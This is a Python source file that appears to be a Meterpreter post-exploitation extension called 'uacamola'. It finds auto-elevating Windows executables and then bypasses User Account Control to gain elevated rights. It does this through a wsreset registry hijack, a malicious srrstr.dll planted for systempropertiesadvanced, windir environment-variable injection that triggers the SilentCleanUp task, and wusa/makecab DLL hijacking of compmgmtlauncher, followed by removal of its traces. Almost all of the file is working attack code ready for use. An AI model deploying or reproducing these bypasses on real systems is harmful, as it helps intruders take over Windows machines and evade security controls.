#Thanks to ext_server_stdapi.py
#There is still a way to go
#Cleaning and extension...


import fnmatch
import getpass
import os
import platform
import re
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import time
import glob
import stat

try:
	import ctypes
	import ctypes.util
	has_ctypes = True
	has_windll = hasattr(ctypes, 'windll')
except ImportError:
	has_ctypes = False
	has_windll = False

try:
	import pty
	has_pty = True
except ImportError:
	has_pty = False

try:
	import pwd
	has_pwd = True
except ImportError:
	has_pwd = False

try:
	import termios
	has_termios = True
except ImportError:
	has_termios = False

try:
	import _winreg as winreg
	has_winreg = True
except ImportError:
	has_winreg = False

try:
	import winreg
	has_winreg = True
except ImportError:
	has_winreg = (has_winreg or False)

if sys.version_info[0] < 3:
	is_str = lambda obj: issubclass(obj.__class__, str)
	is_bytes = lambda obj: issubclass(obj.__class__, str)
	bytes = lambda *args: str(*args[:1])
	NULL_BYTE = '\x00'
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
	if isinstance(__builtins__, dict):
		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
		str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	else:
		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
		str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
	NULL_BYTE = bytes('\x00', 'UTF-8')
	long = int
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)


# TLV DEFINITION

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)
# More TLV
TLV_EXTENSIONS           = 20000
TLV_TYPE_PYTHON_RESULT             = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 8)
TLV_TYPE_PROCESS_PATH              = TLV_META_TYPE_STRING | 2302

# TLV DEFINITION END

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

meterpreter.register_extension('uacamola')

# Meterpreter register function decorators
register_function = meterpreter.register_function
def register_function_if(condition):
	if condition:
		return meterpreter.register_function
	else:
		return lambda function: function

# GENERAL FUNCTIONS BEGIN


@register_function
def uacamola_start_uacamola(request, response):
	return return_success(response,  "Bye")

# GENERAL FUNCTIONS END


# INVESTIGATE FUNCTIONS BEGIN

@register_function
def autoelevate_search(request, response):
    files_auto = []
    try:
        my_path = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"]
        f_exe = glob.glob(my_path + os.sep + "*exe")
        for f in f_exe:
            if check_auto_elevate_aux(f):
                files_auto.append(f)
    except:
        pass
    files_auto = ";".join(files_auto)
    return return_success(response,  files_auto)
    

    
# # INVESTIGATE FUNCTIONS END

# ATTACK FUNCTIONS BEGIN

@register_function
def fileless_wsreset(request, response):
    HKCU = winreg.HKEY_CURRENT_USER
    reg = Registry()
    path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
    instruction =  packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"]
    k = reg.create_key(HKCU, path)
    if not k:
         return return_error(response, "Failure creating registry")
    reg.set_value(HKCU, path, instruction)
    run_binary("C:\\Windows\\System32\\wsreset.exe")
    #reg.restore(k)
    
    return return_success(response, "Done!")

@register_function
def systempropertiesadvanced(request, response):
    malicious_dll = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"]
    user = None
    try:
        res = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
        user = res.stdout.read().split("\\")[1].strip()
    except Exception as e:
        return return_error(response, str(e))
    path = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\WindowsApps" 
    
    if not os.path.isdir(path):
        os.mkdir(path)
    dst = path + "\\srrstr.dll" 
    try:
        shutil.copy(src=malicious_dll, dst=dst)
        run_binary("C:\\Windows\\syswow64\\systempropertiesadvanced.exe")
        return return_success(response, "Done!")
    except Exception as e:
        return return_error(response, str(e))

@register_function
def variable_injection(request, response):
    HKCU = winreg.HKEY_CURRENT_USER
    payload = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"]
    reg = Registry()
    k = reg.create_key(HKCU, "Environment")
    reg.create_value(k, "windir", payload)
    run_binary("schtasks /RUN /TN \Microsoft\windows\DiskCleanUp\SilentCleanUp /I")    
    #reg.del_value(k, "windir")
    return return_success(response, "Done!")

@register_function
def dll_hijacking_wusa(request, response):
    binary = "compmgmtlauncher.exe"
    destination = "C:\\Windows\\System32"
    #common-controls_6595b64144ccf1df_6.0.7601.18837_none_41e855142bd5705d
    
    data = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"].split(" ")
    payload = data[0]
    folder = data[1]
    name_dll = payload.split("\\")[-1]
    complete_path = binary + ".Local\\" + folder + "\\"
    # create path and copy dll
    try:
        subprocess.check_call(["powershell", "-C", "mkdir", complete_path, ">", "$null"])
        subprocess.check_call(["powershell", "-C", "copy", payload, complete_path, ">", "$null"])
        # create ddf file and makecab
        ddf = ".OPTION EXPLICIT\r\n\r\n.Set CabinetNameTemplate=mycab.CAB\r\n.Set DiskDirectoryTemplate=.\r\n\r\n.Set Cabinet=on\n.Set Compress=on\n.Set DestinationDir=" + binary + ".Local\\" + folder + "\r\n \"" + binary + ".Local\\" + folder + "\\" + name_dll +"\""
        with open("proof.ddf", "w") as f:
            f.write(ddf) 
        subprocess.check_call(["powershell", "-C", "makecab.exe", "/f", "proof.ddf", ">", "$null"])
        # run wusa
        p = os.getcwd()
        cab = p + "\\mycab.cab"
        extract = "/extract:" + destination
        subprocess.check_call(["powershell", "-C", "wusa.exe", cab, extract, ">", "$null"])
        # launch
        subprocess.check_call(["powershell", "-C", binary])
        # remove
        path = binary + ".Local"
        subprocess.check_call(["powershell", "-C", "rmdir", "-Recurse", path, ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "proof.ddf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.inf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.rpt", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "mycab.CAB", ">", "$null"])
    except Exception as e:
        return_error(response, str(e))
    return_success(response, "Done!")

# ATTACK FUNCTIONS END

# AUXILIAR FUNCTIONS BEGIN

def return_success(response, result):
    response += tlv_pack(TLV_TYPE_PYTHON_RESULT, result)
    return ERROR_SUCCESS, response

def return_error(response, error):
    response +=  tlv_pack(TLV_TYPE_PYTHON_RESULT, error)
    return ERROR_FAILURE, response


def check_auto_elevate_aux(pt):
	try:
		f = open(pt,'rb')
		if b"<autoElevate>true</autoElevate>" in f.read():
			return True 
		return False           
	except:
		return False

def run_binary(binary, args=None):
    payload = binary
    if args:
        payload += " " + " ".join(args)
    aux = os.popen(payload)

# AUXILIAR FUNCTIONS END



# REGISTRY CLASS

class Registry(object):

    def __init__(self):
        self.last_created = {'key': None,
                             'new_sk': None,
                             'existing_sk': None}
        self.no_restore = False

    def create_key(self, key, subkey):
        """ Creates a key THAT DOESN'T EXIST, we need
        to keep track of the keys that we are creating
        """
        self.no_restore = False
        self.non_existent_path(key, subkey)
        try:
            return winreg.CreateKey(key, subkey)
        except WindowsError as error:
            self.no_restore = True
            return None

    def restore(self, key, value=''):
        """ Restore to the last registry known state
        """
        if self.no_restore is False:
            new_sk = self.last_created['new_sk']
            k = self.last_created['key']
            exist_sk = self.last_created['existing_sk']

            self.del_value(key, value)

            if new_sk is not None:
                for i in range(len(new_sk)):
                    if i == 0:
                        try:
                            winreg.DeleteKey(k, "\\".join(exist_sk + new_sk))
                        except WindowsError as error:
                            return None
                    else:
                        try:
                            winreg.DeleteKey(k, "\\".join(
                                exist_sk + new_sk[:-i]))
                        except WindowsError as error:
                            return None

                self.last_created['new_sk'] = None
                self.last_created['existing_sk'] = None
                self.last_created['key'] = None
        return True

    def non_existent_path(self, key, subkey):
        """ In a path of a key, returns the portion of
        the path that doesn't exist
        """
        s = subkey.split('\\')
        for i in xrange(1, len(s) + 1):
            try:
                winreg.OpenKey(key, "\\".join(s[:i]))
            except WindowsError:
                self.last_created['key'] = key
                self.last_created['new_sk'] = s[i - 1:]
                self.last_created['existing_sk'] = s[:i - 1]
                return "\\".join(s[i - 1:])

    def set_value(self, key, subkey, value):
        """ Set a value in a custom subkey
        """
        try:
            return winreg.SetValue(key, subkey, winreg.REG_SZ, value)
        except:
            self.no_restore = True
            return None

    def del_value(self, key, value=''):
        if self.no_restore is False:
            try:
                return winreg.DeleteValue(key, value)
            except WindowsError as error:
                return None

    def create_value(self, key, value_name, value):
        """ Creates a value THAT DOESN'T EXIST, we need
        to keep track of the keys that we are creating
        """
        self.no_restore = False
        try:
            return winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value)
        except WindowsError as error:
            self.no_restore = True
            return None

    def delete_key(self, key, subkey):
        """ Deletes a particular key
        """
        try:
            return winreg.DeleteKey(key, subkey)
        except WindowsError as error:
            return None

    def open_key(self, key, subkey):
        """ Opens a key
        """
        try:
            return winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
        except:
            return None
